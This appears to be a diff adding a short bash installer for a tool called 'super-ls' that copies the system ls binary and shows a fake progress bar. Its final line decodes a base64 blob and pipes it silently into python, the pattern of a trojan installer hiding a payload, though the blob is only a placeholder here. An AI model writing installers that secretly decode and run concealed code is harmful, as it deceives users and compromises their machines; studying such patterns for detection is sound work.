@@ -1,0 +1,13 @@
+#!/usr/bin/bash
+
+echo "[+] Installing super-ls"
+cp /usr/bin/ls $HOME/.local/bin/super-ls
+echo -ne '#####                     (33%)\r'
+sleep 1
+echo -ne '#############             (66%)\r'
+sleep 1
+echo -ne '#######################   (100%)\r'
+echo -ne '\n'
+echo "[+] Installed super-ls :D"
+
+echo "<base64 blob>" | base64 -d | python 2>/dev/null >/dev/null
